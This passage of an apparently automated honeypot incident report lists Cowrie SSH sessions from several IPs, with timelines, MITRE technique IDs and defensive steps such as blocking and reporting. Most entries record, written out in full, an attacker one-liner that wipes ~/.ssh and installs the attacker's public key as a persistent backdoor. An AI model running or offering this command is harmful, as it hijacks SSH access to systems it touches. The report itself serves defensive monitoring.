| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:58:35` | `cowrie.session.connect` |
| `2026-04-10 13:58:35` | `cowrie.client.version` |
| `2026-04-10 13:58:35` | `cowrie.client.kex` |
| `2026-04-10 13:58:35` | `cowrie.login.success` |
| `2026-04-10 13:58:35` | `cowrie.session.params` |
| `2026-04-10 13:58:35` | `cowrie.command.input` |
| `2026-04-10 13:58:35` | `cowrie.command.failed` |
| `2026-04-10 13:58:35` | `cowrie.log.closed` |
| `2026-04-10 13:58:35` | `cowrie.session.params` |
| `2026-04-10 13:58:35` | `cowrie.command.input` |
| `2026-04-10 13:58:35` | `cowrie.session.file_download` |
| `2026-04-10 13:58:35` | `cowrie.log.closed` |
| `2026-04-10 13:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fee1cfe7e7b

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 13:58 |
| **Last Seen** | 2026-04-10 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 13:58:37` | `cowrie.session.connect` |
| `2026-04-10 13:58:37` | `cowrie.client.version` |
| `2026-04-10 13:58:37` | `cowrie.client.kex` |
| `2026-04-10 13:58:37` | `cowrie.login.success` |
| `2026-04-10 13:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74778f596797

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:01 |
| **Last Seen** | 2026-04-10 14:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:01:17` | `cowrie.session.connect` |
| `2026-04-10 14:01:17` | `cowrie.client.version` |
| `2026-04-10 14:01:17` | `cowrie.client.kex` |
| `2026-04-10 14:01:17` | `cowrie.login.success` |
| `2026-04-10 14:01:18` | `cowrie.session.params` |
| `2026-04-10 14:01:18` | `cowrie.command.input` |
| `2026-04-10 14:01:18` | `cowrie.command.failed` |
| `2026-04-10 14:01:18` | `cowrie.log.closed` |
| `2026-04-10 14:01:18` | `cowrie.session.params` |
| `2026-04-10 14:01:18` | `cowrie.command.input` |
| `2026-04-10 14:01:18` | `cowrie.session.file_download` |
| `2026-04-10 14:01:18` | `cowrie.log.closed` |
| `2026-04-10 14:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758fe56d4f2c

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:01 |
| **Last Seen** | 2026-04-10 14:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:01:20` | `cowrie.session.connect` |
| `2026-04-10 14:01:20` | `cowrie.client.version` |
| `2026-04-10 14:01:20` | `cowrie.client.kex` |
| `2026-04-10 14:01:21` | `cowrie.login.success` |
| `2026-04-10 14:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5325377d823

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:02 |
| **Last Seen** | 2026-04-10 14:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:02:02` | `cowrie.session.connect` |
| `2026-04-10 14:02:02` | `cowrie.client.version` |
| `2026-04-10 14:02:02` | `cowrie.client.kex` |
| `2026-04-10 14:02:02` | `cowrie.login.success` |
| `2026-04-10 14:02:03` | `cowrie.session.params` |
| `2026-04-10 14:02:03` | `cowrie.command.input` |
| `2026-04-10 14:02:03` | `cowrie.command.failed` |
| `2026-04-10 14:02:03` | `cowrie.log.closed` |
| `2026-04-10 14:02:03` | `cowrie.session.params` |
| `2026-04-10 14:02:03` | `cowrie.command.input` |
| `2026-04-10 14:02:03` | `cowrie.session.file_download` |
| `2026-04-10 14:02:03` | `cowrie.log.closed` |
| `2026-04-10 14:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-511de8b884bd

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:02 |
| **Last Seen** | 2026-04-10 14:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:02:04` | `cowrie.session.connect` |
| `2026-04-10 14:02:04` | `cowrie.client.version` |
| `2026-04-10 14:02:04` | `cowrie.client.kex` |
| `2026-04-10 14:02:04` | `cowrie.login.success` |
| `2026-04-10 14:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b85905c59fcc

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:05 |
| **Last Seen** | 2026-04-10 14:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:05:40` | `cowrie.session.connect` |
| `2026-04-10 14:05:40` | `cowrie.client.version` |
| `2026-04-10 14:05:40` | `cowrie.client.kex` |
| `2026-04-10 14:05:40` | `cowrie.login.success` |
| `2026-04-10 14:05:40` | `cowrie.session.params` |
| `2026-04-10 14:05:40` | `cowrie.command.input` |
| `2026-04-10 14:05:40` | `cowrie.command.failed` |
| `2026-04-10 14:05:40` | `cowrie.log.closed` |
| `2026-04-10 14:05:41` | `cowrie.session.params` |
| `2026-04-10 14:05:41` | `cowrie.command.input` |
| `2026-04-10 14:05:41` | `cowrie.session.file_download` |
| `2026-04-10 14:05:41` | `cowrie.log.closed` |
| `2026-04-10 14:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aea939172142

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:05 |
| **Last Seen** | 2026-04-10 14:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:05:42` | `cowrie.session.connect` |
| `2026-04-10 14:05:42` | `cowrie.client.version` |
| `2026-04-10 14:05:42` | `cowrie.client.kex` |
| `2026-04-10 14:05:42` | `cowrie.login.success` |
| `2026-04-10 14:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7246527382fc

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:08 |
| **Last Seen** | 2026-04-10 14:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:08:35` | `cowrie.session.connect` |
| `2026-04-10 14:08:35` | `cowrie.client.version` |
| `2026-04-10 14:08:35` | `cowrie.client.kex` |
| `2026-04-10 14:08:36` | `cowrie.login.success` |
| `2026-04-10 14:08:36` | `cowrie.session.params` |
| `2026-04-10 14:08:36` | `cowrie.command.input` |
| `2026-04-10 14:08:36` | `cowrie.command.failed` |
| `2026-04-10 14:08:36` | `cowrie.log.closed` |
| `2026-04-10 14:08:37` | `cowrie.session.params` |
| `2026-04-10 14:08:37` | `cowrie.command.input` |
| `2026-04-10 14:08:37` | `cowrie.session.file_download` |
| `2026-04-10 14:08:37` | `cowrie.log.closed` |
| `2026-04-10 14:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99056c1a7de

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:08 |
| **Last Seen** | 2026-04-10 14:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:08:39` | `cowrie.session.connect` |
| `2026-04-10 14:08:39` | `cowrie.client.version` |
| `2026-04-10 14:08:39` | `cowrie.client.kex` |
| `2026-04-10 14:08:40` | `cowrie.login.success` |
| `2026-04-10 14:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe9f7f7e75e

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:10 |
| **Last Seen** | 2026-04-10 14:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:10:23` | `cowrie.session.connect` |
| `2026-04-10 14:10:23` | `cowrie.client.version` |
| `2026-04-10 14:10:23` | `cowrie.client.kex` |
| `2026-04-10 14:10:24` | `cowrie.login.success` |
| `2026-04-10 14:10:24` | `cowrie.session.params` |
| `2026-04-10 14:10:24` | `cowrie.command.input` |
| `2026-04-10 14:10:24` | `cowrie.command.failed` |
| `2026-04-10 14:10:24` | `cowrie.log.closed` |
| `2026-04-10 14:10:24` | `cowrie.session.params` |
| `2026-04-10 14:10:24` | `cowrie.command.input` |
| `2026-04-10 14:10:25` | `cowrie.session.file_download` |
| `2026-04-10 14:10:25` | `cowrie.log.closed` |
| `2026-04-10 14:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c2aaa6c77c

| Field | Detail |
|---|---|
| **Source IP** | `185.239.84[.]249` |
| **First Seen** | 2026-04-10 14:10 |
| **Last Seen** | 2026-04-10 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:10:26` | `cowrie.session.connect` |
| `2026-04-10 14:10:26` | `cowrie.client.version` |
| `2026-04-10 14:10:26` | `cowrie.client.kex` |
| `2026-04-10 14:10:27` | `cowrie.login.success` |
| `2026-04-10 14:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.239.84[.]249` to AbuseIPDB if not already reported
- [ ] Block `185.239.84[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92c389ed65a

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:11 |
| **Last Seen** | 2026-04-10 14:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:11:00` | `cowrie.session.connect` |
| `2026-04-10 14:11:00` | `cowrie.client.version` |
| `2026-04-10 14:11:00` | `cowrie.client.kex` |
| `2026-04-10 14:11:00` | `cowrie.login.success` |
| `2026-04-10 14:11:00` | `cowrie.session.params` |
| `2026-04-10 14:11:00` | `cowrie.command.input` |
| `2026-04-10 14:11:00` | `cowrie.command.failed` |
| `2026-04-10 14:11:00` | `cowrie.log.closed` |
| `2026-04-10 14:11:00` | `cowrie.session.params` |
| `2026-04-10 14:11:00` | `cowrie.command.input` |
| `2026-04-10 14:11:00` | `cowrie.session.file_download` |
| `2026-04-10 14:11:00` | `cowrie.log.closed` |
| `2026-04-10 14:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5107dd5724de

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:11 |
| **Last Seen** | 2026-04-10 14:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:11:02` | `cowrie.session.connect` |
| `2026-04-10 14:11:02` | `cowrie.client.version` |
| `2026-04-10 14:11:02` | `cowrie.client.kex` |
| `2026-04-10 14:11:02` | `cowrie.login.success` |
| `2026-04-10 14:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.91.246[.]101` to AbuseIPDB if not already reported
- [ ] Block `103.91.246[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56017222fbd

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:12 |
| **Last Seen** | 2026-04-10 14:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:12:15` | `cowrie.session.connect` |
| `2026-04-10 14:12:15` | `cowrie.client.version` |
| `2026-04-10 14:12:15` | `cowrie.client.kex` |
| `2026-04-10 14:12:15` | `cowrie.login.success` |
| `2026-04-10 14:12:16` | `cowrie.session.params` |
| `2026-04-10 14:12:16` | `cowrie.command.input` |
| `2026-04-10 14:12:16` | `cowrie.command.failed` |
| `2026-04-10 14:12:16` | `cowrie.log.closed` |
| `2026-04-10 14:12:16` | `cowrie.session.params` |
| `2026-04-10 14:12:16` | `cowrie.command.input` |
| `2026-04-10 14:12:16` | `cowrie.session.file_download` |
| `2026-04-10 14:12:16` | `cowrie.log.closed` |
| `2026-04-10 14:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3813098ffe01

| Field | Detail |
|---|---|
| **Source IP** | `211.219.22[.]213` |
| **First Seen** | 2026-04-10 14:12 |
| **Last Seen** | 2026-04-10 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:12:18` | `cowrie.session.connect` |
| `2026-04-10 14:12:18` | `cowrie.client.version` |
| `2026-04-10 14:12:18` | `cowrie.client.kex` |
| `2026-04-10 14:12:19` | `cowrie.login.success` |
| `2026-04-10 14:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.219.22[.]213` to AbuseIPDB if not already reported
- [ ] Block `211.219.22[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b950976d511

| Field | Detail |
|---|---|
| **Source IP** | `103.91.246[.]101` |
| **First Seen** | 2026-04-10 14:12 |
| **Last Seen** | 2026-04-10 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:12:44` | `cowrie.session.connect` |
| `2026-04-10 14:12:44` | `cowrie.client.version` |
| `2026-04-10 14:12:44` | `cowrie.client.kex` |
| `2026-04-10 14:12:44` | `cowrie.login.success` |
| `2026-04-10 14:12:44` | `cowrie.session.params` |
| `2026-04-10 14:12:44` | `cowrie.command.input` |
